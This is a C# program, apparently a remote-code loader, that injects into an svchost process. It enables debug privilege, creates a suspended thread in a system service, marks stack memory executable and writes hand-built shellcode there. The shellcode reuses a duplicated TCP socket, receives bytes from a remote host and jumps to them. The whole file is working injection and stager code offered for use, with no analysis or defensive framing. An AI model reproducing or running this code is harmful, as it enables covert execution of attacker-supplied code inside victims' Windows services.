using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;

namespace RemoteApiClient
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct WSAData
        {
            public Int16 version;
            public Int16 highVersion;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
            public String description;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
            public String systemStatus;

            public Int16 maxSockets;
            public Int16 maxUdpDg;
            public IntPtr vendorInfo;
        }

        
        [StructLayout(LayoutKind.Sequential)]
        struct sockaddr_in
        {
            public ushort sin_family;
            public ushort sin_port;
            public uint sin_addr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] sin_zero;

        }


        [StructLayout(LayoutKind.Sequential)]
        struct GUID
        {
            public int a;
            public short b;
            public short c;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] d;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct WSAPROTOCOL_INFO
        {
            public int dwServiceFlags1;
            public int dwServiceFlags2;
            public int dwServiceFlags3;
            public int dwServiceFlags4;
            public int dwProviderFlags;
            public GUID ProviderId;
            public int dwCatalogEntryId;
            public WSAPROTOCOLCHAIN ProtocolChain;
            public int iVersion;
            public int iAddressFamily;
            public int iMaxSockAddr;
            public int iMinSockAddr;
            public int iSocketType;
            public int iProtocol;
            public int iProtocolMaxOffset;
            public int iNetworkByteOrder;
            public int iSecurityScheme;
            public int dwMessageSize;
            public int dwProviderReserved;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 255 /* WSAPROTOCOL_LEN */ + 1)]
            //public char[] szProtocol;
            public byte[] szProtocol;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WSAPROTOCOLCHAIN
        {
            public int ChainLen;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7 /* MAX_PROTOCOL_CHAIN */)]
            public int[] ChainEntries;
        }

        enum ThreadInfoClass : int
        {
            ThreadQuerySetWin32StartAddress = 9
        }

        [StructLayout(LayoutKind.Sequential)]
        struct THREAD_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr TebBaseAdress;
            public UIntPtr ProcessId;
            public UIntPtr ThreadId;
            public UIntPtr AffinityMask;
            public UIntPtr Priority;
            public uint BasePriority;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            public FLOATING_SAVE_AREA FloatSave;
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct M128A
        {
            public ulong High;
            public long Low;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public uint ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct NtCreateThreadExBuffer
        {
            public uint Size;
            public uint Unknown1;
            public uint Unknown2;
            public IntPtr Unknown3;
            public uint Unknown4;
            public uint Unknown5;
            public uint Unknown6;
            public IntPtr Unknown7;
            public uint Unknown8;
        };

        [StructLayout(LayoutKind.Sequential)]
        internal struct LUID
        {
            internal uint LowPart;
            internal uint HighPart;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct LUID_AND_ATTRIBUTES
        {
            internal LUID Luid;
            internal uint Attributes;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct TOKEN_PRIVILEGE
        {
            internal uint PrivilegeCount;
            internal LUID_AND_ATTRIBUTES Privilege;
        }

        [DllImport("ws2_32.dll")]
        static extern Int32 WSAStartup(ushort wVersionRequested, out WSAData wsaData);
        
        [DllImport("ws2_32.dll", CharSet = CharSet.Ansi)]
        static extern int WSADuplicateSocket(IntPtr s, uint dwProcessId, out WSAPROTOCOL_INFO lpProtocolInfo);

        [DllImport("Ws2_32.dll")]
        public static extern int setsockopt(IntPtr s, int level, int optname, ref int optval, int optlen);

        [DllImport("ws2_32.dll")]
        static extern IntPtr socket(int af, int socket_type, int protocol);
        
        [DllImport("ws2_32.dll")]
        static extern int connect(IntPtr s, ref sockaddr_in addr, int addrsize);

        [DllImport("ws2_32.dll")]
        static extern int send(IntPtr s, IntPtr buf, int len, int flags);

        [DllImport("ws2_32.dll")]
        static extern int WSAGetLastError();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
        
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationThread(IntPtr threadHandle, uint threadInformationClass, out THREAD_BASIC_INFORMATION threadInformation, int threadInformationLength, IntPtr returnLengthPtr);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, /*out*/ IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int nSize, /*out UIntPtr lpNumberOfBytesWritten*/ IntPtr NULL);

        [DllImport("kernel32.dll")]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        //[DllImport("kernel32.dll", SetLastError = true)]
        //static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, /*out*/ IntPtr lpThreadId);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", EntryPoint = "LookupPrivilegeValueW", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID Luid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGE NewState, uint BufferLength, IntPtr PreviousStatePtr, IntPtr ReturnLengthPtr);

        [DllImport("ntdll.dll", ExactSpelling = true)]
        static extern int NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, /*ref NtCreateThreadExBuffer*/IntPtr bytesBuffer);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr handle);


        static bool SetPrivilege(IntPtr tokenHandle, string privilegeName, bool privilegeState)
        {
            const uint SE_PRIVILEGE_DISABLED = 0x00000000;
            const uint SE_PRIVILEGE_ENABLED = 0x00000002;
            LUID luid;

            if (LookupPrivilegeValue(null, privilegeName, out luid))
            {
                TOKEN_PRIVILEGE tp = new TOKEN_PRIVILEGE();

                tp.PrivilegeCount = 1;
                tp.Privilege.Luid = luid;
                tp.Privilege.Attributes = privilegeState ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_DISABLED;
                //
                //  Enable the privilege or disable all privileges.
                //
                if (AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                {
                    ////
                    ////  Check to see if you have proper access.
                    ////  You may get "ERROR_NOT_ALL_ASSIGNED".
                    ////
                    //bRet = (GetLastError() == ERROR_SUCCESS);
                    return true;
                }
            }
            return false;
        }



        internal enum ShellcodeType : byte
        {
            Win32 = 0,
            Win64 = 1
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct EV0REMOTE_LOGIN
        {
            public ushort Ev0remoteProtocol;
            public long Address;
            public long Kernel32;
            public long GetProcAddr;

            public EV0REMOTE_LOGIN(long address, long kernel32, long getProcAddr, ShellcodeType processorType)
            {
                Ev0remoteProtocol = (ushort)(1 | ((byte)processorType << 12));
                Address = address;
                Kernel32 = kernel32;
                GetProcAddr = getProcAddr;
            }
        }


        const uint CONTEXT_CONTROL = 0x10000 | 0x01;
        const uint CONTEXT_INTEGER = 0x10000 | 0x02;
        const byte NULL = 0;
        const uint CREATE_SUSPENDED = 0x00000004;
        const ushort AF_INET = 2;
        const ushort SOCK_STREAM = 1;
        const ushort IPPROTO_TCP = 6;
        const ushort SOL_SOCKET = 0xffff;
        const ushort SO_SNDTIMEO = 0x1005;
        const ushort SO_RCVTIMEO = 0x1006;
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        //const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint PROCESS_CREATE_THREAD = 0x0002;
        const uint PROCESS_VM_OPERATION = 0x0008;
        const uint PROCESS_VM_READ = 0x0010;
        const uint PROCESS_VM_WRITE = 0x0020;
        //const uint THREAD_ALL_ACCESS = 0x001FFFFF;
        const uint THREAD_GET_CONTEXT = 0x0008;
        const uint THREAD_SET_CONTEXT = 0x0010;
        const uint THREAD_SUSPEND_RESUME = 0x0002;
        const uint THREAD_QUERY_LIMITED_INFORMATION = 0x0800;
        static IntPtr SOCKET_ERROR = new IntPtr(-1);
        const int DefaultMsgSize = 512;
        const byte MSG_WAITALL = 0x8;

        static void Main(string[] args)
        {
            bool success;
            bool isX64 = Environment.Is64BitOperatingSystem;

            if(!isX64)
            {
                Console.WriteLine("32-bit operating systems are not supported yet");
                return;
            }

            if(isX64 && IntPtr.Size != 8)
            {
                Console.WriteLine("Please run in x64 mode");
                return;
            }

            const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
            IntPtr tokenHandle;
            success = OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES, out tokenHandle);
            if (!success)
            {
                Console.WriteLine("OpenProcessToken() failed - " + Marshal.GetLastWin32Error());
                return;
            }
            success = SetPrivilege(tokenHandle, "SeDebugPrivilege", true);
            CloseHandle(tokenHandle);
            if (!success)
            {
                Console.WriteLine("SetPrivilege() failed - " + Marshal.GetLastWin32Error());
                return;
            }


            const int bufferlen = 4096;
            UIntPtr buflen = new UIntPtr(bufferlen);
            int err;

            ushort wsaVersion = 0x0202;
            WSAData wsaData;

            err = WSAStartup(wsaVersion, out wsaData);
            if (err != 0)
            {
                Console.WriteLine("WSAStartup() failed - " + err);
                return;
            }
            
            IntPtr tcpSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (tcpSocket == SOCKET_ERROR)
            {
                Console.WriteLine("socket() failed - " + WSAGetLastError());
                return;
            }

#if !DEBUG || true
            int timeout = 10000;
            setsockopt(tcpSocket, SOL_SOCKET, SO_RCVTIMEO, ref timeout, sizeof(int));
            setsockopt(tcpSocket, SOL_SOCKET, SO_SNDTIMEO, ref timeout, sizeof(int));
#endif

            string targetProcessName;
            string targetModuleName;
            if (args.Length > 1)
            {
                targetProcessName = args[1];
                if (args.Length > 2)
                    targetModuleName = args[2].ToLower();
                else
                    targetModuleName = "ws2_32.dll";//null;
            }
            else
            {
                targetProcessName = "svchost";
                targetModuleName = "pcasvc.dll";
            }



            uint ipAddress;

            do
            {
                if (args.Length > 0)
                {
                    IPAddress ipAddr;
                    if (IPAddress.TryParse(args[0], out ipAddr))
                    {
                        byte[] ipBytes = ipAddr.GetAddressBytes();
                        if (ipBytes.Length == 4)
                        {
                            ipAddress = BitConverter.ToUInt32(ipBytes, 0);
                            break;
                        }
                    }
                }

                ipAddress = 0x100007F; //BitConverter.ToUInt32(new byte[] { 127,0,0,1 }, 0)
            } while (false);


            sockaddr_in connectionData = new sockaddr_in();
            connectionData.sin_family = AF_INET;
            connectionData.sin_addr = ipAddress;
            connectionData.sin_port = BitConverter.ToUInt16(new byte[] { 0xD1,0xCC }, 0);


            err = connect(tcpSocket, ref connectionData, Marshal.SizeOf(connectionData));
            if (err != 0)
            {
                Console.WriteLine("connect() failed - " + WSAGetLastError());
                //closesocket(udpSocket);
                //WSACleanup();
                return;
            }

            uint targetProcessId = 0;

#if DEBUG && false
            targetProcessId = (uint)Process.GetProcessesByName("putty")[0].Id;
#else
            

                //if (targetModuleName != null)
                //{

                Process[] svchosts = Process.GetProcessesByName(targetProcessName);
                if (svchosts.Length == 0)
                {
                    Console.WriteLine("No processes found");
                    return;
                }

                foreach (Process process in svchosts)
                {
                    bool found = false;

                    try
                    {
                        foreach (ProcessModule module in process.Modules)
                        {
                            if (module.ModuleName.ToLower() == /*"pcasvc.dll"*/targetModuleName)
                            {
                                targetProcessId = (uint)process.Id;
                                found = true;
                                break;
                            }
                        }
                    }
                    catch { continue; }

                    if (found) break;
                }


            //}
            //else
            //{
            //    Process[] processes = Process.GetProcessesByName(targetProcessName);
            //    if (processes.Length != 0)
            //        targetProcessId = (uint)processes[0].Id;
            //}
#endif
            

            if (targetProcessId == 0)
            {
                Console.WriteLine("No suitable process found");
                return;
            }

            IntPtr processHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, targetProcessId);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("OpenProcess() failed - " + Marshal.GetLastWin32Error());
                return;
            }


            //IntPtr memoryAddress = VirtualAllocEx(processHandle, IntPtr.Zero, buflen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            //if (memoryAddress == IntPtr.Zero)
            //{
            //    Console.WriteLine("VirtualAllocEx() failed");
            //    return;
            //}


            //IntPtr threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, new UIntPtr(8192), IntPtr.Zero, IntPtr.Zero, CREATE_SUSPENDED, IntPtr.Zero);
            //if (threadHandle == IntPtr.Zero)
            //{
            //    Console.WriteLine("CreateRemoteThread() failed");
            //    return;
            //}

            IntPtr threadHandle;
            //NtCreateThreadExBuffer ntCreateThreadExBuffer = new NtCreateThreadExBuffer();
            //IntPtr temp = Marshal.AllocHGlobal(8);

            //ntCreateThreadExBuffer.Size = (uint)Marshal.SizeOf(ntCreateThreadExBuffer);
            //ntCreateThreadExBuffer.Unknown1 = 0x10003;
            //ntCreateThreadExBuffer.Unknown2 = 8;
            //ntCreateThreadExBuffer.Unknown3 = temp + 4;
            //ntCreateThreadExBuffer.Unknown4 = 0;
            //ntCreateThreadExBuffer.Unknown5 = 0x10004;
            //ntCreateThreadExBuffer.Unknown6 = 4;
            //ntCreateThreadExBuffer.Unknown7 = temp;
            //ntCreateThreadExBuffer.Unknown8 = 0;

            int ntstatus = NtCreateThreadEx(out threadHandle, THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_LIMITED_INFORMATION | THREAD_SUSPEND_RESUME, IntPtr.Zero, processHandle, IntPtr.Zero, IntPtr.Zero, true, 0, 8192, 0, /*ref ntCreateThreadExBuffer*/IntPtr.Zero);
            if(ntstatus < 0)
            {
                Console.WriteLine("NtCreateThreadEx() failed - " + ntstatus);
                return;
            }


            THREAD_BASIC_INFORMATION threadInfo;
            ntstatus = NtQueryInformationThread(threadHandle, 0, out threadInfo, 8 + IntPtr.Size * 5, IntPtr.Zero);
            if (ntstatus < 0)
            {
                Console.WriteLine("NtQueryInformationThread() failed - " + ntstatus);
                return;
            }


            byte[] buffer = new byte[IntPtr.Size];
            success = ReadProcessMemory(processHandle, threadInfo.TebBaseAdress + (IntPtr.Size * 1), buffer, IntPtr.Size, IntPtr.Zero);
            if (!success)
            {
                Console.WriteLine("ReadProcessMemory() failed - " + Marshal.GetLastWin32Error());
                return;
            }

            IntPtr memoryAddress;

            if (isX64)
            {
                long stackBottom = BitConverter.ToInt64(buffer, 0);
                memoryAddress = new IntPtr(stackBottom - bufferlen);
            }
            else
            {
                int stackBottom = BitConverter.ToInt32(buffer, 0);
                memoryAddress = new IntPtr(stackBottom - bufferlen);
            }


            uint oldProtection;
            success = VirtualProtectEx(processHandle, memoryAddress, /*buflen*/new UIntPtr(4096), PAGE_EXECUTE_READWRITE, out oldProtection);
            if (!success)
            {
                Console.WriteLine("VirtualProtectEx() failed - " + Marshal.GetLastWin32Error());
                return;
            }

            WSAPROTOCOL_INFO socketData;
            err = WSADuplicateSocket(tcpSocket, targetProcessId, out socketData);
            if (err != 0)
            {
                Console.WriteLine("WSADuplicateSocket() failed - " + WSAGetLastError());
                return;
            }

            IntPtr k32Handle = GetModuleHandle("kernel32.dll");
            if (k32Handle == IntPtr.Zero)
            {
                Console.WriteLine("GetModuleHandle() failed - " + Marshal.GetLastWin32Error());
                return;
            }

            int shellcodeBufferSize = bufferlen;
            IntPtr shellcodeBuffer = Marshal.AllocHGlobal(shellcodeBufferSize);

            IntPtr getProcAddress = GetProcAddress(k32Handle, "GetProcAddress");
            IntPtr getModuleHandleA = GetProcAddress(k32Handle, "GetModuleHandleA");
            IntPtr exitThread = GetProcAddress(k32Handle, "ExitThread");
            //IntPtr setUnhandledExceptionFilter = GetProcAddress(k32Handle, "SetUnhandledExceptionFilter");
            IntPtr addVectoredExceptionHandler = GetProcAddress(k32Handle, "AddVectoredExceptionHandler");
            if(getProcAddress == IntPtr.Zero || getModuleHandleA == IntPtr.Zero || exitThread == IntPtr.Zero || addVectoredExceptionHandler == IntPtr.Zero)
            {
                Console.WriteLine("GetProcAddress() failed - " + Marshal.GetLastWin32Error());
                return;
            }

            Shellcode shellcode;
            ShellcodeType shellcodeType;

            if (isX64)
            {
                FakeObject ws2A, wsasockA, sockData, recv;
                shellcodeType = ShellcodeType.Win64;
                shellcode = new Shellcode64(shellcodeBuffer, shellcodeBufferSize, memoryAddress)

                .DebugBreak()
                .SetEntryPoint()

                //.AlignStack()
                .FakePushBytes(32)
#if !DEBUG || true
                /*.MovInt64RegisterC(exitThread)
                .CallFar(setUnhandledExceptionFilter)*/
                .MovInt64RegisterC(1)
                .MovInt64RegisterD(exitThread)
                .CallFar(addVectoredExceptionHandler)
                /*.PushInt64(exitThread)
                .PushInt64(0)
                .MovRegisterSPtoGSOffset(0)*/
#endif

                .NewFakeObject(Shellcode.AsciiCString("ws2_32"), out ws2A)
                .MovFakePointerRegisterC(ws2A)
                //.FakePushBytes(32)
                .CallFar(getModuleHandleA)
                .FakePopBytes(32)

                .PushRegisterA() //+module
                .PushRegisterA() //+module

                .NewFakeObject(Shellcode.AsciiCString("WSASocketA"), out wsasockA)
                .MovFakePointerRegisterD(wsasockA)
                .MovRegisterAtoC()
                .FakePushBytes(32)
                .CallFar(getProcAddress)
                .FakePopBytes(32)

                .NewFakeObject(socketData, out sockData)
                .PushByte(0)
                .PushByte(0)
                .MovFakePointerRegister9(sockData)
                .MovInt64Register8(IPPROTO_TCP)
                .MovInt64RegisterD(SOCK_STREAM)
                .MovInt64RegisterC(AF_INET)
                .FakePushBytes(32)
                .CallRegisterA()
                .FakePopBytes(48)

                .PopRegisterC() //-module
                .PushRegisterA() //+socket

                .NewFakeObject(Shellcode.AsciiCString("recv"), out recv)
                .MovFakePointerRegisterD(recv)
                .FakePushBytes(32)
                .CallFar(getProcAddress)
                .FakePopBytes(32)

                .PopRegisterC() //-socket
                .PushRegisterA() //+recv
                .PushRegisterC() //+socket

                .MovInt64Register9(/*0*/MSG_WAITALL)
                .MovInt64Register8(/*bufferlen*/DefaultMsgSize)
                .MovInt64RegisterD(memoryAddress)
                .FakePushBytes(32 + 8) //+aligner

                .PushInt64(memoryAddress)
                .JmpRegisterA()

                .Complete();
            }
            else
            {
                FakeObject ws2A, wsasockA, sockData, recvA;
                shellcodeType = ShellcodeType.Win32;
                shellcode = new Shellcode86(shellcodeBuffer, shellcodeBufferSize, memoryAddress)

                .DebugBreak()
                .SetEntryPoint()

                .NewFakeObject(Shellcode.AsciiCString("ws2_32"), out ws2A)
                .PushFakePointer(ws2A)
                //shellcode.CallFar(GetProcAddress(k32Handle, "LoadLibraryA"));  //loaded by default
                .CallFar(getModuleHandleA)

                .PushRegisterA() //+handle

                .NewFakeObject(Shellcode.AsciiCString("WSASocketA"), out wsasockA)
                .PushFakePointer(wsasockA)
                .PushRegisterA()
                .CallFar(getProcAddress)

                .NewFakeObject(socketData, out sockData)
                .PushByte(0)
                .PushByte(0)
                .PushFakePointer(sockData)
                .PushByte((byte)IPPROTO_TCP)
                .PushByte((byte)SOCK_STREAM)
                .PushByte((byte)AF_INET)
                .CallRegisterA()

                .PopRegisterD() //-handle
                                
                .PushByte(/*0*/MSG_WAITALL)
                .PushInt(/*bufferlen*/DefaultMsgSize)
                .PushInt(memoryAddress)
                .PushRegisterA()
                .PushInt(memoryAddress) //for later use

                .NewFakeObject(Shellcode.AsciiCString("recv"), out recvA)
                .PushFakePointer(recvA)
                .PushRegisterD()
                .CallFar(getProcAddress)

                .JmpRegisterA()

                .Complete();
            }


            success = WriteProcessMemory(processHandle, new IntPtr(shellcode.RemoteAddress), shellcode.Buffer, shellcode.Size, IntPtr.Zero);
            if (success == false)
            {
                Console.WriteLine("WriteProcessMemory() failed - " + Marshal.GetLastWin32Error());
                return;
            }

            //IntPtr threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, UIntPtr.Zero, new IntPtr(shellcode.EntryPoint), IntPtr.Zero, NULL, IntPtr.Zero);
            //if(threadHandle == IntPtr.Zero)
            //{
            //    Console.WriteLine("CreateRemoteThread() failed");
            //    err = Marshal.GetLastWin32Error();
            //    return;
            //}

            const string getThreadContextFailed = "GetThreadContext() failed - ";
            const string setThreadContextFailed = "SetThreadContext() failed - ";
            if (isX64)
            {
                CONTEXT64 threadContext = new CONTEXT64() { ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER };
                success = GetThreadContext(threadHandle, ref threadContext);
                if (!success)
                {
                    Console.WriteLine(getThreadContextFailed + Marshal.GetLastWin32Error());
                    return;
                }
                
                threadContext.Rsp = (ulong)shellcode.RemoteAddress;
                threadContext.Rip = (ulong)shellcode.EntryPoint;

                success = SetThreadContext(threadHandle, ref threadContext);
                if (!success)
                {
                    Console.WriteLine(setThreadContextFailed + Marshal.GetLastWin32Error());
                    return;
                }
            }
            else
            {
                CONTEXT threadContext = new CONTEXT() { ContextFlags = CONTEXT_INTEGER };
                success = GetThreadContext(threadHandle, ref threadContext);
                if (!success)
                {
                    Console.WriteLine(getThreadContextFailed + Marshal.GetLastWin32Error());
                    return;
                }

                threadContext.Esp = (uint)shellcode.RemoteAddress;
                threadContext.Eip = (uint)shellcode.EntryPoint;

                success = SetThreadContext(threadHandle, ref threadContext);
                if (!success)
                {
                    Console.WriteLine(setThreadContextFailed + Marshal.GetLastWin32Error());
                    return;
                }
            }

            uint suspendc = ResumeThread(threadHandle);
            if (suspendc == 0xffffffff)
            {
                Console.WriteLine("ResumeThread() failed - " + Marshal.GetLastWin32Error());
                return;
            }
            
            CloseHandle(threadHandle);
            CloseHandle(processHandle);

            EV0REMOTE_LOGIN loginmsg = new EV0REMOTE_LOGIN(shellcode.RemoteAddress, k32Handle.ToInt64(), getProcAddress.ToInt64(), shellcodeType);
            int msgsize = Marshal.SizeOf(loginmsg);
            IntPtr msg = Marshal.AllocHGlobal(msgsize);
            Marshal.StructureToPtr(loginmsg, msg, false);
            send(tcpSocket, msg, msgsize, 0);
        }
    }
}
